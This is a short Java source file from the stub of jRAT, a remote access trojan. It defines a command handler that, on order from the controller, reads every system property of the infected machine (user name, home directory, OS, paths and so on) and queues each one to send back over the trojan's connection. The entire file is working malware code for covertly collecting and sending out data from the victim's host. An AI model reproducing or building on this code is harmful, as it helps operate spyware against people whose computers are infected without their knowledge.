package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet32SystemProperties;

import java.util.Set;


public class Packet90SystemProperties extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			Connection.addToSendQueue(new Packet32SystemProperties(str.toString(), System.getProperty(str.toString())));
		}
	}

}
